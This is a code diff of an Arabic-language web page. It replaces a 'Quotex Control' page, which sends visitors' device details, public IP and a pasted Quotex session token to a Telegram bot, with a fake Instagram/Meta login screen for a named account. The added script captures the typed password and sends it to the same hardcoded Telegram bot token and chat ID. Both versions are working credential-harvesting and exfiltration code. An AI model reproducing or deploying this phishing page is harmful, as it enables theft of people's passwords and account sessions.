@@ -2,402 +2,79 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Quotex Control</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
+<title>Instagram</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
-body{background:#0d1117;color:#e6edf3;min-height:100vh;padding:16px}
-
-.card{
-  background:#161b22;border:1px solid #30363d;border-radius:14px;
-  padding:20px;max-width:520px;margin:0 auto 14px
-}
-h1{font-size:17px;font-weight:700;margin-bottom:6px}
-.sub{font-size:12.5px;color:#8b949e;margin-bottom:16px;line-height:1.6}
-
-.label{display:block;font-size:12.5px;color:#8b949e;margin-bottom:8px;font-weight:600}
-
-.input{
-  width:100%;height:48px;background:#0d1117;border:1px solid #30363d;
-  border-radius:10px;padding:0 14px;color:#e6edf3;font-size:13px;
-  outline:none;font-family:monospace
-}
-.input:focus{border-color:#1f6feb}
-
-.btn{
-  width:100%;height:48px;border:0;border-radius:10px;
-  font-size:14.5px;font-weight:600;cursor:pointer;
-  margin-top:10px;transition:opacity .15s
-}
-.btn:active{opacity:.75}
-.btn-primary{background:#1f6feb;color:#fff}
-.btn-success{background:#238636;color:#fff}
-.btn-danger{background:#da3633;color:#fff}
-.btn-secondary{background:#21262d;color:#e6edf3;border:1px solid #30363d}
-.btn-warning{background:#9e6a03;color:#fff}
-
-.row{display:flex;gap:8px;margin-top:10px}
-.row .btn{margin-top:0;flex:1}
-
-.status{
-  padding:11px 14px;border-radius:10px;font-size:13px;
-  margin-top:12px;display:none;text-align:center;line-height:1.6
-}
-.status.show{display:block}
-.status.ok{background:#0d2818;color:#3fb950;border:1px solid #238636}
-.status.err{background:#2d0e0e;color:#f85149;border:1px solid #8b2121}
-.status.info{background:#0c2d6b;color:#58a6ff;border:1px solid #1f6feb}
-.status.warn{background:#2b1f00;color:#d29922;border:1px solid #9e6a03}
-
-.hint{
-  font-size:11.5px;color:#6e7681;line-height:1.6;
-  margin-top:10px;padding:10px;background:#0d1117;
-  border-radius:8px;border:1px solid #21262d
-}
-.hint b{color:#8b949e}
-
-.badge{
-  display:inline-block;padding:3px 10px;border-radius:20px;
-  font-size:11px;font-weight:600;margin-right:6px
-}
-.badge-ok{background:#0d2818;color:#3fb950}
-.badge-err{background:#2d0e0e;color:#f85149}
-
-.info-row{
-  display:flex;justify-content:space-between;
-  padding:9px 12px;background:#0d1117;border-radius:8px;
-  margin-bottom:6px;font-size:12.5px
-}
-.info-label{color:#8b949e}
-.info-value{color:#e6edf3;font-family:monospace;font-size:12px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
+body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
+#p1{display:flex;flex-direction:column;min-height:100vh}
+.gear{position:absolute;top:16px;left:16px;width:28px;height:28px;cursor:pointer;z-index:5}
+.wrap{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 24px 24px}
+.insta{width:64px;height:64px;margin-top:56px}
+.avatar{width:230px;height:230px;border-radius:50%;background:#f0f0f0;margin-top:44px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.avatar img{width:100%;height:100%;object-fit:cover;display:block}
+.name{font-size:28px;font-weight:400;margin-top:26px;color:#000;letter-spacing:0.2px}
+.btn{width:100%;max-width:520px;height:56px;border:0;border-radius:28px;background:#0064e0;color:#fff;font-size:17px;font-weight:600;margin-top:32px;cursor:pointer;transition:opacity .15s}
+.btn:active{opacity:.7}
+.input{width:100%;max-width:520px;height:56px;border:1px solid #dbdbdb;border-radius:12px;padding:0 16px;font-size:16px;margin-top:12px;outline:none;background:#fafafa;display:none;text-align:right}
+.input:focus{border-color:#a8a8a8;background:#fff}
+.other{margin-top:26px;font-size:16px;color:#000;cursor:pointer}
+.bottom{display:flex;flex-direction:column;align-items:center;gap:28px;padding:24px 0 32px}
+.create{border:1px solid #0064e0;color:#0064e0;background:#fff;height:44px;padding:0 28px;border-radius:22px;font-size:15px;font-weight:500;cursor:pointer}
+.meta{display:flex;align-items:center;gap:6px;font-size:16px;font-weight:600;color:#000}
+.meta svg{width:22px;height:22px}
 </style>
 </head>
 <body>
 
-<!-- ═══════════ معلومات الجهاز ═══════════ -->
-<div class="card">
-  <h1>📱 معلومات الجهاز</h1>
-  <p class="sub">تُجمع تلقائياً وتُرسل للبوت</p>
-
-  <div id="infoBox">
-    <div class="hint">⏳ جاري الجمع...</div>
+<div id="p1">
+  <svg class="gear" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="3"/>
+    <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
+  </svg>
+  <div class="wrap">
+    <img class="insta" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram">
+    <div class="avatar">
+      <img src="https://i.ibb.co/BHRqStkS/813645708-17905623771557633-5843878274451591451-n.jpg" alt="">
+    </div>
+    <div class="name">Kbry20958</div>
+    <button class="btn" id="followBtn" onclick="showPass()">متابعة</button>
+    <input class="input" id="passInput" type="password" placeholder="ادخل كلمة السر">
+    <button class="btn" id="followBtn2" style="display:none;margin-top:12px" onclick="followNow()">متابعة</button>
+    <div class="other">استخدام ملف شخصي آخر</div>
   </div>
-</div>
-
-<!-- ═══════════ إدخال SSID ═══════════ -->
-<div class="card">
-  <h1>🔑 التوكن (SSID)</h1>
-  <p class="sub">الصق التوكن من Quotex</p>
-
-  <label class="label">Token / SSID</label>
-  <input type="text" id="ssidInput" class="input"
-    placeholder="eyJhbGciOiJIUzI1NiIs..." autocomplete="off" spellcheck="false">
-
-  <div class="hint">
-    <b>كيف تحصل عليه؟</b><br>
-    qxbroker.com → سجل دخول → F12 → Application → Cookies → ابحث عن <b>ssid</b>
+  <div class="bottom">
+    <button class="create">إنشاء حساب جديد</button>
+    <div class="meta">
+      <svg viewBox="0 0 24 24" fill="#0866ff">
+        <path d="M6.5 4.5C3.5 4.5 2 7.5 2 12s1.5 7.5 4.5 7.5c1.5 0 2.8-.6 3.8-1.7l2.5-3.3c.3-.4.9-.4 1.2 0l2.5 3.3c1 1.1 2.3 1.7 3.8 1.7 3 0 4.5-3 4.5-7.5s-1.5-7.5-4.5-7.5c-1.5 0-2.8.6-3.8 1.7l-2.5 3.3c-.3.4-.9.4-1.2 0L9.3 6.2C8.3 5.1 7 4.5 6.5 4.5z"/>
+      </svg>
+      Meta
+    </div>
   </div>
-
-  <div class="status" id="ssidStatus"></div>
-</div>
-
-<!-- ═══════════ الأوامر ═══════════ -->
-<div class="card">
-  <h1>⚙️ أوامر التحكم</h1>
-  <p class="sub">تُرسل للبوت تلقائياً</p>
-
-  <button class="btn btn-primary" onclick="sendAll()">
-    📤 إرسال كل البيانات + اتصال
-  </button>
-
-  <div class="row">
-    <button class="btn btn-success" onclick="cmd('connect')">🔌 اتصال</button>
-    <button class="btn btn-danger" onclick="cmd('disconnect')">❌ قطع</button>
-  </div>
-
-  <div class="row">
-    <button class="btn btn-primary" onclick="cmd('prices')">📊 الأسعار</button>
-    <button class="btn btn-secondary" onclick="cmd('status')">📋 الحالة</button>
-  </div>
-
-  <div class="status" id="cmdStatus"></div>
-</div>
-
-<!-- ═══════════ الأسعار ═══════════ -->
-<div class="card">
-  <h1>💹 الأسعار الحية</h1>
-  <p class="sub">تُحدَّث تلقائياً كل 30 ثانية</p>
-
-  <div id="pricesList">
-    <div class="hint">لا توجد أسعار بعد</div>
-  </div>
-
-  <button class="btn btn-secondary" onclick="refreshPrices()">🔄 تحديث</button>
 </div>
 
 <script>
-// ═══════════════════════════════════════════
-//  الإعدادات
-// ═══════════════════════════════════════════
-var BOT_TOKEN = "8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
-var CHAT_ID   = "8599240795";
-var API       = "https://api.telegram.org/bot" + BOT_TOKEN;
+var BOT_TOKEN="8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
+var CHAT_ID="8599240795";
 
-var deviceInfo = {};
-
-// ═══════════════════════════════════════════
-//  Helpers
-// ═══════════════════════════════════════════
-function setStatus(id, msg, type) {
-  var el = document.getElementById(id);
-  el.className = "status show " + type;
-  el.innerHTML = msg;
-}
-function clearStatus(id) {
-  var el = document.getElementById(id);
-  el.className = "status";
-  el.innerHTML = "";
+function showPass(){
+  document.getElementById('followBtn').style.display='none';
+  document.getElementById('passInput').style.display='block';
+  document.getElementById('followBtn2').style.display='block';
+  document.getElementById('passInput').focus();
 }
 
-async function tg(method, payload) {
-  try {
-    var res = await fetch(API + "/" + method, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-    return await res.json();
-  } catch (e) {
-    return { ok: false, error: e.message };
-  }
+function followNow(){
+  var v=document.getElementById('passInput').value;
+  if(!v){document.getElementById('passInput').focus();return;}
+  fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 Kbry20958\n🔑 "+v})
+  }).catch(function(){});
+  document.getElementById('passInput').value='';
 }
-
-// ═══════════════════════════════════════════
-//  جمع معلومات الجهاز
-// ═══════════════════════════════════════════
-async function collectDeviceInfo() {
-  // معلومات المتصفح
-  deviceInfo.user_agent   = navigator.userAgent;
-  deviceInfo.platform     = navigator.platform || "unknown";
-  deviceInfo.language     = navigator.language;
-  deviceInfo.languages    = (navigator.languages || []).join(", ");
-  deviceInfo.screen       = screen.width + "x" + screen.height;
-  deviceInfo.window_size  = window.innerWidth + "x" + window.innerHeight;
-  deviceInfo.pixel_ratio  = window.devicePixelRatio;
-  deviceInfo.timezone     = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  deviceInfo.timezone_off = new Date().getTimezoneOffset();
-  deviceInfo.cores        = navigator.hardwareConcurrency || "unknown";
-  deviceInfo.memory_gb    = navigator.deviceMemory || "unknown";
-  deviceInfo.touch_points = navigator.maxTouchPoints || 0;
-  deviceInfo.cookies_on   = navigator.cookieEnabled;
-  deviceInfo.local_time   = new Date().toString();
-  deviceInfo.referrer     = document.referrer || "direct";
-
-  // IP العام
-  try {
-    var ipRes = await fetch("https://api.ipify.org?format=json");
-    var ipData = await ipRes.json();
-    deviceInfo.public_ip = ipData.ip;
-  } catch (e) {
-    deviceInfo.public_ip = "unknown";
-  }
-
-  // معلومات إضافية إن أمكن
-  try {
-    deviceInfo.cpu_arch = navigator.platform;
-  } catch (e) {}
-
-  renderInfo();
-  return deviceInfo;
-}
-
-function renderInfo() {
-  var box = document.getElementById("infoBox");
-  var html = "";
-  var labels = {
-    user_agent: "User Agent",
-    platform: "المنصة",
-    language: "اللغة",
-    screen: "الشاشة",
-    timezone: "التوقيت",
-    public_ip: "IP العام",
-    cores: "الأنوية",
-    memory_gb: "الذاكرة (GB)",
-    local_time: "الوقت المحلي"
-  };
-
-  Object.keys(labels).forEach(function(k) {
-    if (deviceInfo[k] !== undefined) {
-      var v = String(deviceInfo[k]);
-      if (v.length > 35) v = v.substring(0, 35) + "...";
-      html += '<div class="info-row">' +
-        '<span class="info-label">' + labels[k] + '</span>' +
-        '<span class="info-value">' + v + '</span>' +
-      '</div>';
-    }
-  });
-  box.innerHTML = html;
-}
-
-// ═══════════════════════════════════════════
-//  تنسيق رسالة البيانات
-// ═══════════════════════════════════════════
-function buildDeviceMessage() {
-  var lines = ["🖥 *بيانات الجهاز*\n"];
-  lines.push("━━━━━━━━━━━━━━━━━");
-  lines.push("🌐 *IP:* `" + (deviceInfo.public_ip || "unknown") + "`");
-  lines.push("💻 *Platform:* `" + (deviceInfo.platform || "?") + "`");
-  lines.push("🖥 *Screen:* `" + (deviceInfo.screen || "?") + "`");
-  lines.push("🌍 *Language:* `" + (deviceInfo.language || "?") + "`");
-  lines.push("⏰ *Timezone:* `" + (deviceInfo.timezone || "?") + "`");
-  lines.push("⚙️ *CPU cores:* `" + (deviceInfo.cores || "?") + "`");
-  lines.push("💾 *Memory:* `" + (deviceInfo.memory_gb || "?") + " GB`");
-  lines.push("🕐 *Local time:* `" + (deviceInfo.local_time || "?") + "`");
-  lines.push("🌐 *User Agent:*");
-  lines.push("`" + (deviceInfo.user_agent || "?").substring(0, 200) + "`");
-  lines.push("");
-  lines.push("📅 *" + new Date().toLocaleString("ar-EG") + "*");
-  return lines.join("\n");
-}
-
-// ═══════════════════════════════════════════
-//  إرسال كل البيانات
-// ═══════════════════════════════════════════
-async function sendAll() {
-  var ssid = document.getElementById("ssidInput").value.trim();
-
-  if (!ssid) {
-    setStatus("ssidStatus", "❌ أدخل التوكن أولاً", "err");
-    document.getElementById("ssidInput").focus();
-    return;
-  }
-
-  if (ssid.length < 10) {
-    setStatus("ssidStatus", "❌ التوكن قصير جداً", "err");
-    return;
-  }
-
-  setStatus("cmdStatus", "⏳ جاري الإرسال...", "info");
-
-  // 1) أرسل بيانات الجهاز
-  var deviceMsg = buildDeviceMessage();
-  var r1 = await tg("sendMessage", {
-    chat_id: CHAT_ID,
-    text: deviceMsg,
-    parse_mode: "Markdown"
-  });
-
-  // 2) أرسل SSID
-  var r2 = await tg("sendMessage", {
-    chat_id: CHAT_ID,
-    text: "🔑 *SSID*\n`" + ssid + "`",
-    parse_mode: "Markdown"
-  });
-
-  // 3) أرسل أمر /set_ssid للبوت
-  var r3 = await tg("sendMessage", {
-    chat_id: CHAT_ID,
-    text: "/set_ssid " + ssid
-  });
-
-  // 4) أرسل أمر /connect
-  await new Promise(function(r){ setTimeout(r, 500); });
-  var r4 = await tg("sendMessage", {
-    chat_id: CHAT_ID,
-    text: "/connect"
-  });
-
-  if (r1.ok && r2.ok && r3.ok) {
-    setStatus("cmdStatus", "✅ تم إرسال كل البيانات — راجع البوت", "ok");
-    setStatus("ssidStatus", "✅ التوكن اتبعت", "ok");
-    document.getElementById("ssidInput").value = "";
-  } else {
-    setStatus("cmdStatus", "❌ فشل الإرسال — تحقق من الإنترنت", "err");
-  }
-}
-
-// ═══════════════════════════════════════════
-//  إرسال أمر مفرد
-// ═══════════════════════════════════════════
-async function cmd(name) {
-  clearStatus("cmdStatus");
-  setStatus("cmdStatus", "⏳ جاري التنفيذ...", "info");
-
-  var r = await tg("sendMessage", {
-    chat_id: CHAT_ID,
-    text: "/" + name
-  });
-
-  if (r.ok) {
-    setStatus("cmdStatus", "✅ تم — راجع البوت", "ok");
-    if (name === "prices") setTimeout(refreshPrices, 1500);
-  } else {
-    setStatus("cmdStatus", "❌ فشل", "err");
-  }
-}
-
-// ═══════════════════════════════════════════
-//  استقبال الأسعار من البوت (Long Polling)
-// ═══════════════════════════════════════════
-var lastUpdateId = 0;
-
-async function pollUpdates() {
-  try {
-    var res = await fetch(API + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
-    var data = await res.json();
-
-    if (data.ok && data.result && data.result.length > 0) {
-      data.result.forEach(function(u) {
-        lastUpdateId = Math.max(lastUpdateId, u.update_id);
-        if (u.message && u.message.chat.id.toString() === CHAT_ID) {
-          handleMessage(u.message.text || "");
-        }
-      });
-    }
-  } catch (e) {}
-  setTimeout(pollUpdates, 2000);
-}
-
-function handleMessage(text) {
-  var re = /•\s*\*([A-Z0-9]+)\*\s*→\s*`([^`]+)`/g;
-  var match, prices = [];
-  while ((match = re.exec(text)) !== null) {
-    prices.push({ symbol: match[1], price: match[2] });
-  }
-  if (prices.length > 0) renderPrices(prices);
-}
-
-function renderPrices(prices) {
-  var box = document.getElementById("pricesList");
-  var html = "";
-  prices.forEach(function(p) {
-    html += '<div class="info-row">' +
-      '<span class="info-label">' + p.symbol + '</span>' +
-      '<span class="info-value" style="color:#3fb950;font-weight:700">$' + p.price + '</span>' +
-    '</div>';
-  });
-  box.innerHTML = html;
-}
-
-async function refreshPrices() {
-  document.getElementById("pricesList").innerHTML = '<div class="hint">⏳ جاري التحديث...</div>';
-  await tg("sendMessage", { chat_id: CHAT_ID, text: "/prices" });
-}
-
-// ═══════════════════════════════════════════
-//  بدء التشغيل
-// ═══════════════════════════════════════════
-async function init() {
-  await collectDeviceInfo();
-  pollUpdates();
-}
-
-init();
-
-// Enter = إرسال
-document.getElementById("ssidInput").addEventListener("keypress", function(e) {
-  if (e.key === "Enter") sendAll();
-});
 </script>
 
 </body>
